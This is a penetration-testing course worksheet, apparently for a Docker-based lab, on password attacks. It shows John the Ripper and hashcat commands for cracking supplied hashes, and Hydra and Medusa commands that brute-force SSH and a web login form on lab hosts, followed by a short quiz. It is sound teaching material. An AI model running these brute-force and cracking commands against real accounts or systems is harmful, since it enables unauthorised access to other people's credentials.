# Lab 6: Password Attacks
## Phase 3 — Gaining Access | Student Worksheet

---

## Before We Start (2 minutes)

**Lab-only reminder:** only target `10.10.6.0/24` — the containers this lab starts.

**What you're practicing:** the two families of password attack — cracking hashes you already have offline, and brute-forcing live login services online — and building intuition for why weak passwords fail so quickly against both.

---

## Setup (5 minutes)

```bash
make build-base
cd labs/phase3-gaining-access/lab6-password-attacks
docker compose up -d
docker exec -it lab6-attacker bash
ls /wordlists /hashes
```

**Check:** Do you see `basic.txt` and the hash files? ✓ Yes ✓ No

---

## Part 1: Offline Cracking with John the Ripper (20 minutes)

### Exercise 1.1: Crack MD5 hashes

```bash
john --wordlist=/wordlists/basic.txt --format=Raw-MD5 /hashes/easy-md5.txt
john --show --format=Raw-MD5 /hashes/easy-md5.txt
```

**What plaintext passwords did you recover?**

| Hash (first 8 chars) | Plaintext |
|------------------------|-----------|
|                         |           |
|                         |           |

### Exercise 1.2: Crack a shadow-style hash

```bash
john --wordlist=/wordlists/basic.txt /hashes/john-format.txt
john --show /hashes/john-format.txt
```

**Did the small wordlist crack it?** ✓ Yes ✓ No

If not, escalate to the full rockyou wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /hashes/john-format.txt
john --show /hashes/john-format.txt
```

**What password did you recover, and which wordlist found it?**

_________________________________

**Question:** Why did the small curated wordlist fail here while rockyou (a real breach-derived list) succeeded?

_________________________________

---

## Part 2: Offline Cracking with Hashcat (15 minutes)

### Exercise 2.1: Identify the hash type

Hash formats have recognizable lengths: MD5 is 32 hex characters, SHA-1 is 40, SHA-256 is 64.

```bash
cat /hashes/medium-sha256.txt
wc -c /hashes/medium-sha256.txt
```

**How many hex characters is this hash? What type must it be?**

_________________________________

### Exercise 2.2: Crack it with hashcat

SHA-256 raw hashes are hashcat mode `1400`.

```bash
hashcat -a 0 -m 1400 /hashes/medium-sha256.txt /wordlists/basic.txt
hashcat -m 1400 /hashes/medium-sha256.txt --show
```

**What was the plaintext?** _________________________________

**Question:** `-a 0` is a straight wordlist attack. What does hashcat's `-a 3` (mask/brute-force) mode do differently, and when would you reach for it instead?

_________________________________

---

## Part 3: Online Brute-Forcing with Hydra (20 minutes)

### Exercise 3.1: SSH brute-force

```bash
hydra -l admin -P /wordlists/basic.txt ssh://10.10.6.10
```

**Did Hydra find valid credentials?** ✓ Yes ✓ No — what were they? _________________________________

### Exercise 3.2: Confirm access and grab the flag

```bash
ssh admin@10.10.6.10
# use the password Hydra found
cat user.txt
```

**Flag:** _________________________________

### Exercise 3.3: Web login form brute-force

`hydra`'s `http-post-form` module needs the login path, the POST body template (with `^USER^`/`^PASS^` placeholders), and a string that appears only on failure:

```bash
hydra -l admin -P /wordlists/basic.txt 10.10.6.11 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid username or password"
```

**Did Hydra find valid credentials for the web login?** ✓ Yes ✓ No: _________________________________

**Question:** Why does Hydra need you to tell it what a *failed* login response looks like, rather than just trying every password until one seems to work?

_________________________________

---

## Part 4: Medusa as a Second Opinion (10 minutes)

Different tools implement the same attack differently — worth knowing more than one.

```bash
medusa -h 10.10.6.10 -u user1 -P /wordlists/basic.txt -M ssh
```

**Did Medusa recover user1's password? What was it?**

_________________________________

---

## Quick Knowledge Check

1. What's the fundamental difference between offline and online password attacks?
   - A) Offline attacks are always faster because you're not limited by network round-trips or lockout policies  B) There's no difference  C) Online attacks are always faster  D) Offline attacks require a network connection

2. Why might a small, curated wordlist fail where a large breach-derived list (like rockyou) succeeds?
   - A) Curated lists are always better  B) Real users tend to reuse passwords found in actual historical breaches  C) rockyou is faster to load  D) There's no meaningful difference

3. In `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:Invalid username or password"`, what does the third field do?
   - A) Sets a timeout  B) Tells Hydra what text in the response means the attempt failed  C) Sets the HTTP method  D) Specifies an SSL port

4. What does hashcat mode `1400` correspond to?
   - A) MD5  B) SHA-1  C) SHA-256  D) NTLM

5. Why check a hash's character length before choosing a cracking mode?
   - A) You shouldn't — it doesn't matter  B) The length is a strong hint at the hash algorithm, which determines which mode/format to use  C) It determines the wordlist  D) It sets the salt

---

## Cleanup

```bash
exit
cd labs/phase3-gaining-access/lab6-password-attacks
docker compose down
```

---

## Summary

Today you learned to:
✓ Crack hashes offline with John the Ripper and Hashcat
✓ Escalate from a small wordlist to rockyou when needed
✓ Brute-force SSH and a web login form with Hydra
✓ Cross-check results with Medusa
✓ Identify a hash type by length before choosing a cracking mode

---

## Optional: CTF Challenge

See **[ctf-challenge.md](./ctf-challenge.md)**. Two flags — one via SSH password cracking, one via the web login form. Flag format `flag{...}`. Walkthrough: **[ctf-walkthrough.md](./ctf-walkthrough.md)**.
